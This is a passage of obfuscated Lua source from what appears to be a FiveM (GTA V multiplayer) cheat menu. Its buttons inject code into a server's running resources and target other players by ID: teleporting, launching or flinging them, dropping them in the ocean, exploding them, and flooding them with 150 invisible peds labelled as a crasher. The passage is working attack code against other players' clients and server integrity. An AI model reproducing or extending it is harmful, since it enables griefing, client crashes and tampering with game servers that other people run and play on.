    ]],v95,v322));MachoMenuNotification("NPC System","Ped spam started! Target ID: "   .. v322 );end);MachoMenuButton(v90,"Stop Ped Spam",function() local v323=0 -0 ;while true do if (v323==(0 + 0)) then if  not v94 then local v822=0 + 0 ;while true do if ((0 -0)==v822) then MachoMenuNotification("Info","Already stopped.");return;end end end v94=false;v323=4 -3 ;end if (v323==(1 -0)) then MachoInjectResource("monitor",[[
        TriggerEvent("stopPedSpamExploit")
    ]]);MachoMenuNotification("NPC System","Ped spam stopped!");break;end end end);MachoMenuText(v91,"Player Manipulation");local v97=MachoMenuInputbox(v91,"Target Player ID (Bring)","e.g., 123");MachoMenuButton(v91,"Bring to Self",function() local v324=tonumber(MachoMenuGetInputbox(v97));if (v324 and (v324>(0 + 0))) then MachoMenuNotification("Bring","Bringing player ID: "   .. v324 );MachoInjectResource("monitor",string.format([[
            local playerPed = PlayerPedId()
            local targetServerId = %d
            local targetPlayer = GetPlayerFromServerId(targetServerId)
            
            if targetPlayer then
                local targetPed = GetPlayerPed(targetPlayer)
                if targetPed and targetPed ~= 0 then
                    local targetCoords = GetEntityCoords(targetPed)
                    local originalPos = GetEntityCoords(playerPed)
                    local targetName = GetPlayerName(targetPlayer)
                    
                    -- Teleport to target
                    SetEntityCoords(playerPed, targetCoords.x, targetCoords.y, targetCoords.z, false, false, false, true)
                    
                    -- Wait a moment
                    Citizen.Wait(150)
                    
                    -- Trigger carry on target (this makes you carry them)
                    TriggerEvent('m3-smallresources:CarryHideInTrunk:carryPlayer')
                    
                    -- Wait for carry to start
                    Citizen.Wait(500)
                    
                    -- Teleport back to original position (player being carried will follow)
                    SetEntityCoords(playerPed, originalPos.x, originalPos.y, originalPos.z, false, false, false, true)
                    
                    -- Wait a moment for them to arrive
                    Citizen.Wait(200)
                    
                    -- Drop them automatically
                    TriggerEvent('m3-smallresources:CarryHideInTrunk:dropPlayer')
                    TriggerServerEvent('m3-smallresources:CarryHideInTrunk:dropPlayer', targetServerId)
                    
                    print(">> Brought " .. targetName .. " to you!")
                    TriggerEvent('chat:addMessage', { args = { '^2Bring:', 'Brought ' .. targetName .. ' (ID: ' .. targetServerId .. ') to you!' } })
                else
                    TriggerEvent('chat:addMessage', { args = { '^1Bring:', 'Target player not in game! ID: ' .. targetServerId } })
                end
            else
                TriggerEvent('chat:addMessage', { args = { '^1Bring:', 'Player not found! ID: ' .. targetServerId } })
            end
        ]],v324));MachoMenuNotification("Bring","Player brought to you!");else MachoMenuNotification("Error","Please enter a valid player ID!");end end);local v98=MachoMenuInputbox(v91,"Target Player ID (Launch)","e.g., 123");MachoMenuButton(v91,"Launch Player",function() local v325=tonumber(MachoMenuGetInputbox(v98));if (v325 and (v325>0)) then MachoMenuNotification("Launch","Launching player ID: "   .. v325 );local v545=nil;if (GetResourceState("monitor")=="started") then v545="monitor";elseif (GetResourceState("qb-core")=="started") then v545="qb-core";else v545="ox_inventory";end MachoInjectResource2(NewThreadNs,v545,string.format([[
            local targetServerId = %d
            local targetPlayer = GetPlayerFromServerId(targetServerId)
            
            if not targetPlayer then
                print("Launch: Player not found!")
                return
            end
            
            local targetPed = GetPlayerPed(targetPlayer)
            if not targetPed or not DoesEntityExist(targetPed) then
                print("Launch: Target ped not found!")
                return
            end
            
            if targetPed == PlayerPedId() then
                print("Launch: Cannot target self!")
                return
            end
            
            local myPed = PlayerPedId()
            local myCoords = GetEntityCoords(myPed)
            local targetCoords = GetEntityCoords(targetPed)
            local distance = #(myCoords - targetCoords)
            
            local teleported = false
            local originalCoords = myCoords
            
            -- Teleport to target if far away
            if distance > 10.0 then
                local angle = math.random() * 2 * math.pi
                local radiusOffset = math.random(5, 9)
                local xOffset = math.cos(angle) * radiusOffset
                local yOffset = math.sin(angle) * radiusOffset
                local newCoords = vector3(targetCoords.x + xOffset, targetCoords.y + yOffset, targetCoords.z)
                SetEntityCoordsNoOffset(myPed, newCoords.x, newCoords.y, newCoords.z, false, false, false)
                SetEntityVisible(myPed, false, 0)
                teleported = true
                Wait(100)
            end
            
            -- Launch effect
            ClearPedTasksImmediately(myPed)
            for i = 1, 15 do
                if not DoesEntityExist(targetPed) then break end
                local curTargetCoords = GetEntityCoords(targetPed)
                if not curTargetCoords then break end
                
                SetEntityCoords(myPed, curTargetCoords.x, curTargetCoords.y, curTargetCoords.z + 0.5, false, false, false, false)
                Wait(50)
                AttachEntityToEntityPhysically(myPed, targetPed, 0, 0.0, 0.0, 0.0, 150.0, 0.0, 0.0, 0.0, 0.0, 0.0, 1, false, false, 1, 2)
                Wait(50)
                DetachEntity(myPed, true, true)
                Wait(100)
            end
            
            Wait(500)
            ClearPedTasksImmediately(myPed)
            
            -- Return to original position
            if originalCoords then
                SetEntityCoords(myPed, originalCoords.x, originalCoords.y, originalCoords.z + 1.0, false, false, false, false)
                Wait(100)
                SetEntityCoords(myPed, originalCoords.x, originalCoords.y, originalCoords.z, false, false, false, false)
            end
            
            if teleported then
                SetEntityVisible(myPed, true, 0)
            end
            
            local targetName = GetPlayerName(targetPlayer)
            print("Launch: Launched " .. targetName)
            TriggerEvent('chat:addMessage', { args = { '^2Launch:', 'Launched ' .. targetName .. ' (ID: %d)' } })
        ]],v325,v325));else MachoMenuNotification("Error","Please enter a valid player ID!");end end);local v99=MachoMenuInputbox(v91,"Target Player ID (To Ocean)","e.g., 123");MachoMenuButton(v91,"Teleport to Ocean",function() local v326=0 -0 ;local v327;while true do if ((0 + 0)==v326) then v327=tonumber(MachoMenuGetInputbox(v99));if (v327 and (v327>0)) then MachoMenuNotification("Ocean","Sending player ID: "   .. v327   .. " to ocean" );local v823=nil;if (GetResourceState("monitor")=="started") then v823="monitor";elseif (GetResourceState("qb-core")=="started") then v823="qb-core";else v823="ox_inventory";end MachoInjectResource2(NewThreadNs,v823,string.format([[
            local targetServerId = %d
            local targetPlayer = GetPlayerFromServerId(targetServerId)
            
            if not targetPlayer then
                print("Ocean: Player not found!")
                return
            end
            
            local targetPed = GetPlayerPed(targetPlayer)
            if not targetPed or not DoesEntityExist(targetPed) then
                print("Ocean: Target ped not found!")
                return
            end
            
            if targetPed == PlayerPedId() then
                print("Ocean: Cannot target self!")
                return
            end
            
            local vehicle = GetVehiclePedIsIn(targetPed, false)
            local oceanCoords = vector3(2899.825, -5220.937, 121.9951)
            
            if vehicle and vehicle ~= 0 then
                -- Teleport vehicle to ocean
                NetworkRequestControlOfEntity(vehicle)
                local timeout = 0
                while not NetworkHasControlOfEntity(vehicle) and timeout < 100 do
                    NetworkRequestControlOfEntity(vehicle)
                    Wait(10)
                    timeout = timeout + 1
                end
                
                if NetworkHasControlOfEntity(vehicle) then
                    SetEntityCoords(vehicle, oceanCoords.x, oceanCoords.y, oceanCoords.z, false, false, false, false)
                    SetEntityVelocity(vehicle, 0.0, 0.0, -50.0)
                    SetVehicleEngineOn(vehicle, false, true, true)
                    SetVehicleUndriveable(vehicle, true)
                end
            else
                -- Teleport player to ocean
                SetEntityCoords(targetPed, oceanCoords.x, oceanCoords.y, oceanCoords.z, false, false, false, false)
            end
            
            local targetName = GetPlayerName(targetPlayer)
            print("Ocean: Sent " .. targetName .. " to ocean")
            TriggerEvent('chat:addMessage', { args = { '^2Ocean:', 'Sent ' .. targetName .. ' to the ocean!' } })
        ]],v327,v327));else MachoMenuNotification("Error","Please enter a valid player ID!");end break;end end end);local v100=MachoMenuInputbox(v91,"Target Player ID (Glitch Vehicle)","e.g., 123");MachoMenuButton(v91,"Glitch Vehicle",function() local v328=0;local v329;while true do if (v328==0) then v329=tonumber(MachoMenuGetInputbox(v100));if (v329 and (v329>(0 -0))) then local v824=0;while true do if (0==v824) then MachoInjectResource("monitor",string.format([[
            local targetServerId = %d
            local targetPlayer = GetPlayerFromServerId(targetServerId)
            
            if not targetPlayer then
                TriggerEvent('chat:addMessage', { args = { '^1Glitch Vehicle:', 'Player not found! ID: %d' } })
                return
            end
            
            local selected_ped = GetPlayerPed(targetPlayer)
            
            if not DoesEntityExist(selected_ped) then
                TriggerEvent('chat:addMessage', { args = { '^1Glitch Vehicle:', 'Target player not in game! ID: %d' } })
                return
            end
            
            if selected_ped == PlayerPedId() then
                TriggerEvent('chat:addMessage', { args = { '^1Glitch Vehicle:', 'You cannot target yourself!' } })
                return
            end
            
            local myCoords = GetEntityCoords(PlayerPedId())
            local selected_coords = GetEntityCoords(selected_ped)
            local vehped = GetVehiclePedIsIn(selected_ped, false)
            
            -- Find nearest vehicle to target
            local nearestVehicle = GetClosestVehicle(selected_coords, 150.0, 0, 70)
            
            if not nearestVehicle or nearestVehicle == 0 then
                TriggerEvent('chat:addMessage', { args = { '^1Glitch Vehicle:', 'No vehicle found nearby target!' } })
                return
            end
            
            -- Get target player name
            local targetName = GetPlayerName(targetPlayer)
            
            -- Put player in vehicle
            SetPedIntoVehicle(PlayerPedId(), nearestVehicle, -1)
            SetEntityVisible(PlayerPedId(), false, false)
            Wait(300)
            
            local veh2 = GetVehiclePedIsIn(PlayerPedId(), false)
            local net = VehToNet(veh2)
            NetworkRequestControlOfEntity(veh2)
            SetPlayersLastVehicle(veh2)
            SetNetworkIdExistsOnAllMachines(NetworkGetNetworkIdFromEntity(veh2), true)
            SetNetworkIdAlwaysExistsForPlayer(net, PlayerPedId(), true)
            NetworkUseHighPrecisionBlending(net, true)
            SetVehicleExclusiveDriver_2(veh2, PlayerPedId(), true)
            SetVehicleExclusiveDriver(veh2, PlayerPedId(), true)
            NetworkSetEntityGhostedWithOwner(veh2, true)
            SetVehicleEngineOn(veh2, true, true, true)
            Citizen.InvokeNative(0xA670B3662FAFFBD0, net)
            Citizen.InvokeNative(0xB69317BF5E782347, veh2)
            
            Wait(200)
            ClearPedTasksImmediately(PlayerPedId())
            
            -- Attach vehicle to target's vehicle
            AttachEntityToEntityPhysically(
                nearestVehicle,
                vehped,
                -99999999999,
                -99999999999999999999999999,
                2,
                -9999999999999999999999.58,
                -9999999999.928,
                800990.0,
                2980.0,
                89999.0,
                99999.0,
                true,
                true,
                false,
                true,
                0
            )
            
            SetEntityCoordsNoOffset(PlayerPedId(), myCoords.x, myCoords.y, myCoords.z, true, true, false, true)
            Wait(100)
            SetPedIntoVehicle(PlayerPedId(), nearestVehicle, -1)
            
            local veh3 = GetVehiclePedIsIn(PlayerPedId(), false)
            local net2 = VehToNet(veh3)
            NetworkRequestControlOfEntity(veh3)
            SetPlayersLastVehicle(veh3)
            SetNetworkIdExistsOnAllMachines(NetworkGetNetworkIdFromEntity(veh3), true)
            SetNetworkIdAlwaysExistsForPlayer(net2, PlayerPedId(), true)
            NetworkUseHighPrecisionBlending(net2, true)
            SetVehicleExclusiveDriver_2(veh3, PlayerPedId(), true)
            SetVehicleExclusiveDriver(veh3, PlayerPedId(), true)
            NetworkSetEntityGhostedWithOwner(veh3, true)
            SetVehicleEngineOn(veh3, true, true, true)
            Citizen.InvokeNative(0xA670B3662FAFFBD0, net2)
            Citizen.InvokeNative(0xB69317BF5E782347, veh3)
            
            -- Re-attach
            AttachEntityToEntityPhysically(
                nearestVehicle,
                vehped,
                -99999999999,
                -99999999999999999999999999,
                2,
                -9999999999999999999999.58,
                -9999999999.928,
                800990.0,
                2980.0,
                89999.0,
                99999.0,
                true,
                true,
                false,
                true,
                0
            )
            
            Wait(10)
            SetEntityVisible(PlayerPedId(), true, true)
            SetEntityCoordsNoOffset(PlayerPedId(), myCoords.x, myCoords.y, myCoords.z, true, true, false, true)
            
            TriggerEvent('chat:addMessage', { args = { '^2Glitch Vehicle:', 'Vehicle glitched on ' .. targetName .. ' (ID: %d)' } })
        ]],v329,v329,v329,v329));MachoMenuNotification("Glitch Vehicle","Vehicle glitch initiated on ID: "   .. v329 );break;end end else MachoMenuNotification("Error","Please enter a valid player ID!");end break;end end end);local v101=MachoMenuInputbox(v91,"Target Player ID (Ban)","e.g., 123");MachoMenuButton(v91,"s1 Ban Player",function() local v330=tonumber(MachoMenuGetInputbox(v101));if (v330 and (v330>0)) then local v546=17 -(12 + 5) ;while true do if (v546==(0 -0)) then MachoMenuNotification("s1 Ban","Ban effect initiating on ID: "   .. v330 );MachoInjectResource("monitor",string.format([[
            local targetServerId = %d
            print("s1 Ban: Target ID " .. targetServerId)
            
            local targetPlayer = GetPlayerFromServerId(targetServerId)
            
            if not targetPlayer then
                print("s1 Ban: Player not found!")
                TriggerEvent('chat:addMessage', { args = { '^1s1 Ban:', 'Player not found! ID: %d' } })
                return
            end
            
            local targetPed = GetPlayerPed(targetPlayer)
            if not targetPed or not DoesEntityExist(targetPed) then
                print("s1 Ban: Target ped not found!")
                TriggerEvent('chat:addMessage', { args = { '^1s1 Ban:', 'Target player not in game! ID: %d' } })
                return
            end
            
            if targetPed == PlayerPedId() then
                print("s1 Ban: Cannot target self!")
                TriggerEvent('chat:addMessage', { args = { '^1s1 Ban:', 'You cannot target yourself!' } })
                return
            end
            
            print("s1 Ban: Player found, starting ban effect...")
            local targetCoords = GetEntityCoords(targetPed)
            local vehicleModel = GetHashKey("mule")
            
            RequestModel(vehicleModel)
            local timeout = 0
            while not HasModelLoaded(vehicleModel) and timeout < 100 do
                Wait(10)
                timeout = timeout + 1
            end
            
            if HasModelLoaded(vehicleModel) then
                print("s1 Ban: Model loaded, creating vehicle...")
                
                -- If player is in a vehicle, kick them out first
                if IsPedInAnyVehicle(targetPed, false) then
                    local theirVeh = GetVehiclePedIsIn(targetPed, false)
                    if theirVeh ~= 0 then
                        ClearPedTasksImmediately(targetPed)
                        TaskLeaveVehicle(targetPed, theirVeh, 0)
                        Wait(500)
                    end
                end
                
                local veh = CreateVehicle(vehicleModel, targetCoords.x, targetCoords.y + 3, targetCoords.z, 0.0, true, true)
                SetEntityVisible(veh, false, false)
                Wait(400)
                SetEntityCoords(veh, targetCoords.x, targetCoords.y, targetCoords.z + 2.0, true, true, true, true)
                
                if DoesEntityExist(veh) then
                    print("s1 Ban: Vehicle created, attaching player...")
                    SetEntityVisible(veh, false, false)
                    SetEntityAsMissionEntity(veh, true, true)
                    SetEntityDynamic(veh, true)
                    SetEntityCollision(veh, true, true)
                    ActivatePhysics(veh)
                    
                    -- Attach player to the vehicle
                    SetPedIntoVehicle(targetPed, veh, -1)
                    
                    local targetName = GetPlayerName(targetPlayer)
                    TriggerEvent('chat:addMessage', { args = { '^1s1 Ban:', 'Ban effect on ' .. targetName .. ' (ID: %d)' } })
                    
                    CreateThread(function()
                        Wait(2000)
                        if DoesEntityExist(veh) then
                            print("s1 Ban: Applying force...")
                            ApplyForceToEntity(
                                veh,
                                1,
                                150000.0,
                                0.0,
                                350000000.0,
                                0.0,
                                0.0,
                                0.0,
                                0,
                                true,
                                true,
                                true,
                                false,
                                true
                            )
                            Wait(6000)
                            if DoesEntityExist(veh) then
                                print("s1 Ban: Deleting vehicle...")
                                DeleteEntity(veh)
                            end
                        end
                    end)
                else
                    print("s1 Ban: Failed to create vehicle!")
                    TriggerEvent('chat:addMessage', { args = { '^1s1 Ban:', 'Failed to create vehicle!' } })
                end
            else
                print("s1 Ban: Failed to load model!")
                TriggerEvent('chat:addMessage', { args = { '^1s1 Ban:', 'Failed to load model!' } })
            end
            
            SetModelAsNoLongerNeeded(vehicleModel)
        ]],v330,v330,v330,v330));v546=1 -0 ;end if ((1 -0)==v546) then MachoMenuNotification("s1 Ban","Ban effect sent to ID: "   .. v330 );break;end end else MachoMenuNotification("Error","Please enter a valid player ID!");end end);local v102=MachoMenuInputbox(v91,"Target Player ID (Crash V1)","e.g., 123");MachoMenuButton(v91,"Crash V1 (Ped Flood)",function() local v331=tonumber(MachoMenuGetInputbox(v102));if (v331 and (v331>(0 -0))) then MachoMenuNotification("Crash V1","Invisible crasher deploying on ID: "   .. v331 );local v547=nil;if (GetResourceState("monitor")=="started") then v547="monitor";elseif (GetResourceState("qb-core")=="started") then v547="qb-core";elseif (GetResourceState("es_extended")=="started") then v547="es_extended";elseif (GetResourceState("m3-apartments")=="started") then v547="m3-apartments";elseif (GetResourceState("m3-inventory")=="started") then v547="m3-inventory";elseif (GetResourceState("m3-hud")=="started") then v547="m3-hud";elseif (GetResourceState("ox_inventory")=="started") then v547="ox_inventory";else v547="qb-core";end MachoInjectResource2(NewThreadNs,v547,string.format([[
            local targetServerId = %d
            local targetPlayer = GetPlayerFromServerId(targetServerId)
            
            if not targetPlayer then
                print("Crash V1: Player not found!")
                return
            end
            
            local targetPed = GetPlayerPed(targetPlayer)
            if not targetPed or not DoesEntityExist(targetPed) then
                print("Crash V1: Target ped not found!")
                return
            end
            
            if targetPed == PlayerPedId() then
                print("Crash V1: Cannot target self!")
                return
            end
            
            print("Crash V1: Deploying invisible crasher on " .. GetPlayerName(targetPlayer))
            
            local modelHash = GetHashKey("player_one")
            RequestModel(modelHash)
            local timeout = 0
            while not HasModelLoaded(modelHash) and timeout < 100 do
                Citizen.Wait(100)
                timeout = timeout + 1
            end
            
            if HasModelLoaded(modelHash) then
                local myPed = PlayerPedId()
                local targetCoords = GetEntityCoords(targetPed)
                local entities = {}
                
                for i = 1, 150 do
                    local angle = math.random() * 2 * math.pi
                    local distance = math.random() * 4.5
                    local x = targetCoords.x + (distance * math.cos(angle))
                    local y = targetCoords.y + (distance * math.sin(angle))
                    local z = targetCoords.z
                    
                    local hasGround, groundZ = GetGroundZFor_3dCoord(x, y, z + 2.0, false)
                    if hasGround then
                        z = groundZ
                    end
                    
                    local ped = CreatePed(28, modelHash, x, y, z, math.random(0, 359), true, false)
                    
                    if DoesEntityExist(ped) then
                        SetEntityAlpha(ped, 0, false)
                        SetEntityVisible(ped, false, false)
                        FreezeEntityPosition(ped, true)
                        SetEntityCollision(ped, false, false)
                        SetEntityNoCollisionEntity(ped, myPed, true)
                        SetEntityCanBeDamaged(ped, false)
                        SetEntityInvincible(ped, true)
                        SetPedCanRagdoll(ped, false)
                        SetBlockingOfNonTemporaryEvents(ped, true)
                        SetPedFleeAttributes(ped, 0, false)
                        SetPedCombatAttributes(ped, 0, false)
                        SetPedCombatAttributes(ped, 5, false)
                        SetPedSeeingRange(ped, 0.0)
                        SetPedHearingRange(ped, 0.0)
                        SetPedAsNoLongerNeeded(ped)
                        table.insert(entities, ped)
                    end
                    
                    if i % 6 == 0 then
                        Citizen.Wait(200)
                    end
                end
                
                SetModelAsNoLongerNeeded(modelHash)
                
                local targetName = GetPlayerName(targetPlayer)
                print("Crash V1: Invisible crasher deployed on " .. targetName)
                TriggerEvent('chat:addMessage', { args = { '^1Crash V1:', 'Invisible crasher deployed on ' .. targetName .. ' (ID: %d)' } })
                
                -- Clean up after 60 seconds
                Citizen.SetTimeout(60000, function()
                    local count = 0
                    for _, ent in ipairs(entities) do
                        if DoesEntityExist(ent) then
                            DeleteEntity(ent)
                            count = count + 1
                        end
                    end
                    print("Crash V1: Crasher cleaned up - " .. count .. " peds deleted")
                    TriggerEvent('chat:addMessage', { args = { '^2Crash V1:', 'Crasher cleaned up - ' .. count .. ' peds deleted' } })
                end)
            else
                print("Crash V1: Failed to load model!")
                TriggerEvent('chat:addMessage', { args = { '^1Crash V1:', 'Failed to load model!' } })
            end
        ]],v331));MachoMenuNotification("Crash V1","Invisible crasher deployed on ID: "   .. v331 );else MachoMenuNotification("Error","Please enter a valid player ID!");end end);local v103=MachoMenuInputbox(v91,"Target Player ID (Whale)","e.g., 123");MachoMenuButton(v91,"Whale on Player",function() local v332=0 + 0 ;local v333;while true do if (v332==(1973 -(1656 + 317))) then v333=tonumber(MachoMenuGetInputbox(v103));if (v333 and (v333>(0 + 0))) then local v825=0 + 0 ;local v826;while true do if (v825==(0 -0)) then MachoMenuNotification("Whale","Spawning whale on ID: "   .. v333 );v826=nil;v825=1;end if (v825==2) then MachoMenuNotification("Whale","Whale spawn sent to ID: "   .. v333 );break;end if (v825==(4 -3)) then if (GetResourceState("monitor")=="started") then v826="monitor";elseif (GetResourceState("qb-core")=="started") then v826="qb-core";elseif (GetResourceState("es_extended")=="started") then v826="es_extended";elseif (GetResourceState("m3-apartments")=="started") then v826="m3-apartments";elseif (GetResourceState("m3-inventory")=="started") then v826="m3-inventory";elseif (GetResourceState("m3-hud")=="started") then v826="m3-hud";elseif (GetResourceState("ox_inventory")=="started") then v826="ox_inventory";else v826="qb-core";end MachoInjectResource2(NewThreadNs,v826,string.format([[
            local targetServerId = %d
            local targetPlayer = GetPlayerFromServerId(targetServerId)
            
            if not targetPlayer then
                print("Whale: Player not found!")
                TriggerEvent('chat:addMessage', { args = { '^1Whale:', 'Player not found! ID: %d' } })
                return
            end
            
            local targetPed = GetPlayerPed(targetPlayer)
            if not targetPed or not DoesEntityExist(targetPed) then
                print("Whale: Target ped not found!")
                TriggerEvent('chat:addMessage', { args = { '^1Whale:', 'Target player not in game! ID: %d' } })
                return
            end
            
            if targetPed == PlayerPedId() then
                print("Whale: Cannot target self!")
                TriggerEvent('chat:addMessage', { args = { '^1Whale:', 'You cannot target yourself!' } })
                return
            end
            
            print("Whale: Spawning whale on " .. GetPlayerName(targetPlayer))
            
            local pos = GetEntityCoords(targetPed)
            local heading = GetEntityHeading(targetPed)
            local pedModel = "A_C_HumpBack"
            local modelHash = GetHashKey(pedModel)
            
            RequestModel(modelHash)
            local timeout = 0
            while not HasModelLoaded(modelHash) and timeout < 500 do
                Citizen.Wait(10)
                timeout = timeout + 10
            end
            
            if HasModelLoaded(modelHash) then
                local whale = CreatePed(28, modelHash, pos.x, pos.y, pos.z + 5, heading, true, false)
                
                if DoesEntityExist(whale) then
                    SetEntityAsMissionEntity(whale, true, true)
                    SetEntityInvincible(whale, true)
                    SetEntityVelocity(whale, math.random(-10, 10), math.random(-10, 10), -15)
                    TaskWanderInArea(whale, pos.x, pos.y, pos.z, 10.0, 10.0, 10.0)
                    
                    local targetName = GetPlayerName(targetPlayer)
                    print("Whale: Whale spawned on " .. targetName)
                    TriggerEvent('chat:addMessage', { args = { '^2Whale:', 'Whale spawned on ' .. targetName .. ' (ID: %d)' } })
                else
                    print("Whale: Failed to create whale!")
                    TriggerEvent('chat:addMessage', { args = { '^1Whale:', 'Failed to create whale!' } })
                end
                
                SetModelAsNoLongerNeeded(modelHash)
                
                -- Delete whale after 10 seconds
                Citizen.SetTimeout(10000, function()
                    if DoesEntityExist(whale) then
                        DeleteEntity(whale)
                        print("Whale: Whale deleted")
                    end
                end)
            else
                print("Whale: Failed to load whale model!")
                TriggerEvent('chat:addMessage', { args = { '^1Whale:', 'Failed to load whale model!' } })
            end
        ]],v333,v333,v333));v825=2;end end else MachoMenuNotification("Error","Please enter a valid player ID!");end break;end end end);MachoMenuButton(v91,"Uncuff Near Player",function() local v334=354 -(5 + 349) ;local v335;while true do if ((4 -3)==v334) then MachoInjectResource2(NewThreadNs,v335,[[
        TriggerEvent('police:client:UnCuffPlayer', 'handcuffs')
        print("Uncuff Near Player triggered")
        TriggerEvent('chat:addMessage', { args = { '^2Uncuff:', 'Attempted to uncuff nearby player!' } })
    ]]);MachoMenuNotification("Uncuff","Attempted to uncuff nearby player!");break;end if (v334==(1271 -(266 + 1005))) then v335=nil;if (GetResourceState("monitor")=="started") then v335="monitor";elseif (GetResourceState("qb-core")=="started") then v335="qb-core";elseif (GetResourceState("es_extended")=="started") then v335="es_extended";else v335="ox_inventory";end v334=1 + 0 ;end end end);local v104=MachoMenuInputbox(v91,"Target Player ID (Medkit Revive)","e.g., 123");MachoMenuButton(v91,"Medkit Revive",function() local v336=tonumber(MachoMenuGetInputbox(v104));if (v336 and (v336>(0 -0))) then MachoMenuNotification("Medkit Revive","Reviving player ID: "   .. v336 );local v548=false;pcall(function() TriggerServerEvent("medkit:revivePlayer",v336);v548=true;end);if  not v548 then local v780=0 -0 ;local v781;while true do if (v780==(1697 -(561 + 1135))) then MachoInjectResource2(NewThreadNs,v781,string.format([[
                local targetServerId = %d
                TriggerServerEvent('medkit:revivePlayer', targetServerId)
                print("Medkit Revive: Revived player ID: " .. targetServerId)
                TriggerEvent('chat:addMessage', { args = { '^2Medkit Revive:', 'Revived player ID: ' .. targetServerId } })
            ]],v336));break;end if (v780==(0 -0)) then v781=nil;if (GetResourceState("monitor")=="started") then v781="monitor";elseif (GetResourceState("qb-core")=="started") then v781="qb-core";elseif (GetResourceState("es_extended")=="started") then v781="es_extended";else v781="ox_inventory";end v780=1;end end end MachoMenuNotification("Medkit Revive","Revive sent to ID: "   .. v336 );else MachoMenuNotification("Error","Please enter a valid player ID!");end end);local v105=MachoMenuInputbox(v91,"Target Player ID (Explode M1)","e.g., 123");MachoMenuButton(v91,"S1 Explode Player Method 1",function() local v337=tonumber(MachoMenuGetInputbox(v105));if (v337 and (v337>(0 -0))) then MachoMenuNotification("Explode M1","Exploding player ID: "   .. v337 );local v549=nil;if (GetResourceState("monitor")=="started") then v549="monitor";elseif (GetResourceState("qb-core")=="started") then v549="qb-core";elseif (GetResourceState("qb-core")=="started") then v549="qb-core";else v549="qb-core";end MachoInjectResource2(NewThreadNs,v549,string.format([[
            local targetServerId = %d
            local targetPlayer = GetPlayerFromServerId(targetServerId)
            
            if not targetPlayer then
                print("Explode M1: Player not found!")
                TriggerEvent('chat:addMessage', { args = { '^1Explode M1:', 'Player not found! ID: %d' } })
                return
            end
            
            local targetPed = GetPlayerPed(targetPlayer)
            if not targetPed or not DoesEntityExist(targetPed) then
                print("Explode M1: Target ped not found!")
                TriggerEvent('chat:addMessage', { args = { '^1Explode M1:', 'Target player not in game!' } })
                return
            end
            
            if targetPed == PlayerPedId() then
                print("Explode M1: Cannot target self!")
                TriggerEvent('chat:addMessage', { args = { '^1Explode M1:', 'You cannot target yourself!' } })
                return
            end
            
            print("Explode M1: Exploding " .. GetPlayerName(targetPlayer))
            
            local coords = GetEntityCoords(targetPed)
            local model = GetHashKey("sultan")
            
            RequestModel(model)
            local timeout = 0
            while not HasModelLoaded(model) and timeout < 100 do
                Wait(10)
                timeout = timeout + 1
            end
            
            if HasModelLoaded(model) then
                local veh = CreateVehicle(model, coords.x, coords.y + 10, coords.z, 0.0, true, false)
                SetEntityVisible(veh, false, false)
                AddVehiclePhoneExplosiveDevice(veh)
                Wait(1000)
                SetEntityCoords(veh, GetEntityCoords(targetPed), true, true, true)
                Wait(100)
                DetonateVehiclePhoneExplosiveDevice(veh)
                Wait(400)
                
                if DoesEntityExist(veh) then
                    DeleteEntity(veh)
                end
                
                SetModelAsNoLongerNeeded(model)
                
                local targetName = GetPlayerName(targetPlayer)
                print("Explode M1: Exploded " .. targetName)
                TriggerEvent('chat:addMessage', { args = { '^1Explode M1:', 'Exploded ' .. targetName .. ' Method 1' } })
            else
                print("Explode M1: Failed to load model!")
                TriggerEvent('chat:addMessage', { args = { '^1Explode M1:', 'Failed to load model!' } })
            end
        ]],v337,v337,v337));MachoMenuNotification("Explode M1","Explosion sent to ID: "   .. v337 );else MachoMenuNotification("Error","Please enter a valid player ID!");end end);local v106=MachoMenuInputbox(v91,"Target Player ID (Explode M2)","e.g., 123");MachoMenuButton(v91,"S1 Explode Player Method 2",function() local v338=0;local v339;while true do if (v338==0) then v339=tonumber(MachoMenuGetInputbox(v106));if (v339 and (v339>(1066 -(507 + 559)))) then MachoMenuNotification("Explode M2","Exploding player ID: "   .. v339 );local v827=nil;if (GetResourceState("monitor")=="started") then v827="monitor";elseif (GetResourceState("qb-core")=="started") then v827="qb-core";elseif (GetResourceState("es_extended")=="started") then v827="es_extended";elseif (GetResourceState("m3-apartments")=="started") then v827="m3-apartments";elseif (GetResourceState("m3-inventory")=="started") then v827="m3-inventory";elseif (GetResourceState("m3-hud")=="started") then v827="m3-hud";elseif (GetResourceState("ox_inventory")=="started") then v827="ox_inventory";else v827="qb-core";end MachoInjectResource2(NewThreadNs,v827,string.format([[
            local targetServerId = %d
            local targetPlayer = GetPlayerFromServerId(targetServerId)
            
            if not targetPlayer then
                print("Explode M2: Player not found!")
                TriggerEvent('chat:addMessage', { args = { '^1Explode M2:', 'Player not found! ID: %d' } })
                return
            end
            
            local targetPed = GetPlayerPed(targetPlayer)
            if not targetPed or not DoesEntityExist(targetPed) then
                print("Explode M2: Target ped not found!")
                TriggerEvent('chat:addMessage', { args = { '^1Explode M2:', 'Target player not in game!' } })
                return
            end
            
            if targetPed == PlayerPedId() then
                print("Explode M2: Cannot target self!")
                TriggerEvent('chat:addMessage', { args = { '^1Explode M2:', 'You cannot target yourself!' } })
                return
            end
            
            print("Explode M2: Exploding " .. GetPlayerName(targetPlayer))
            
            local veh = GetHashKey("volatus")
            RequestModel(veh)
            local timeout = 0
            while not HasModelLoaded(veh) and timeout < 100 do
                Wait(10)
                timeout = timeout + 1
            end
            
            if HasModelLoaded(veh) then
                local coords = GetEntityCoords(targetPed)
                local vehh = CreateVehicle(veh, coords.x, coords.y, coords.z + 30, 0.0, true, true)
                Wait(1000)
                SetEntityVisible(vehh, false, false)
                SetVehicleEngineHealth(vehh, -4000.0)
                SetVehicleBodyHealth(vehh, 0.0)
                SetVehicleFuelLevel(vehh, 1000.0)
                SetEntityVelocity(vehh, 0.0, 0.0, -80.0)
                Wait(400)
                
                if DoesEntityExist(vehh) then
                    DeleteEntity(vehh)
                end
                
                SetModelAsNoLongerNeeded(veh)
                
                local targetName = GetPlayerName(targetPlayer)
                print("Explode M2: Exploded " .. targetName)
                TriggerEvent('chat:addMessage', { args = { '^1Explode M2:', 'Exploded ' .. targetName .. ' Method 2' } })
            else
                print("Explode M2: Failed to load model!")
                TriggerEvent('chat:addMessage', { args = { '^1Explode M2:', 'Failed to load model!' } })
            end
